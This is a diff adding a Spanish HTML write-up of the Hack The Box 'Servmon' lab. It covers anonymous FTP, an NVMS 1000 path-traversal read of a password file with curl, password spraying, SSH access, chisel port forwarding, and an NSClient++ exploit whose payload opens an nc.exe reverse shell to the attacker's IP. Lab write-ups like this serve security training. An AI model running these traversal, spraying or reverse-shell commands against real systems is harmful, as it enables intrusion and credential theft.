@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Servmon HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/windows.html">~/writeups/windows</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/servmon/pasted-20260319125604.png" alt="Servmon HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Windows</p>
+          <h1>Servmon</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>nvms</span>
+            <span>nsclient</span>
+            <span>lfi</span>
+            <span>port forwarding</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: FTP anónimo revela usuarios y posibles ficheros de contraseñas</li>
+            <li><code>Explotación</code>: LFI en NVMS 1000 permite leer passwords y acceder por SSH</li>
+            <li><code>Escalada de Privilegios</code>: NSClient++ en puerto interno explotable mediante port forwarding</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319134438.png" alt="Servmon HTB" />
+          <div class="code-card">
+            <h3>FTP anónimo</h3>
+            <pre><code>ftp servmon
+# Credenciales: anonymous:''
+get users/nathan/Confidential.txt
+get users/nadine/'Notes to do.txt'
+# Usuarios nathan y nadine
+# Ruta sensible: /users/nathan/desktop/Passwords.txt"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319134912.png" alt="Servmon HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Buscar vulnerabilidades del CMS NVMS</h3>
+            <pre><code>searchsploit nvms
+# LFI</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319134658.png" alt="Servmon HTB" />
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319134640.png" alt="Servmon HTB" />
+          <div class="code-card">
+            <h3>Ejecutar LFI desde Burpsuite o curl con el parámetro --path-as-is</h3>
+            <pre><code>curl --path-as-is -v "http://servmon/../../../../../users/nathan/desktop/Passwords.txt"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319134415.png" alt="Servmon HTB" />
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc SMB servmon -u users -p pass --continue-on-success
+# nadine:L1k3B1gBut7s@W0rk</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260319140753.png" alt="Servmon HTB" />
+          <div class="code-card">
+            <h3>Acceso SSH</h3>
+            <pre><code>ssh nadine@servmon
+# nadine:L1k3B1gBut7s@W0rk</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Web NSSClient++</h2>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260327130547.png" alt="Servmon HTB" />
+          <div class="code-card">
+            <h3>Comandos</h3>
+            <pre><code>searchsploit NSClient++
+# No me ha funcionado este exploit manual</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260327130453.png" alt="Servmon HTB" />
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260327130652.png" alt="Servmon HTB" />
+          <h3>[PoC GitHub](https://github.com/xtizi/NSClient-0.5.2.35---Privilege-Escalation)</h3>
+          <div class="code-card">
+            <h3>Local port forwarding</h3>
+            <pre><code>ssh -L 8443:127.0.0.1:8443 nadine@servmon
+L1k3B1gBut7s@W0rk
+# Subir nc.exe
+
+# Alternativa
+ssh nadine@servmon
+# Password: L1k3B1gBut7s@W0rk
+# Kali 
+chisel server -p 9090 --reverse --socks5
+# Windows
+chisel client 10.10.16.69:9090  R:8443:127.0.0.1:8443</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Ejecutar Exploit</h3>
+            <pre><code># Kali
+penelope -p 443
+
+python3 exploit.py "C:\\Temp\\nc.exe 10.10.16.69 443 -e cmd.exe" https://localhost:8443 ew2x6SsGTxjRwXOT</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/servmon/pasted-20260327152617.png" alt="Servmon HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>nvms</span>
+            <span>nsclient</span>
+            <span>lfi</span>
+            <span>port forwarding</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
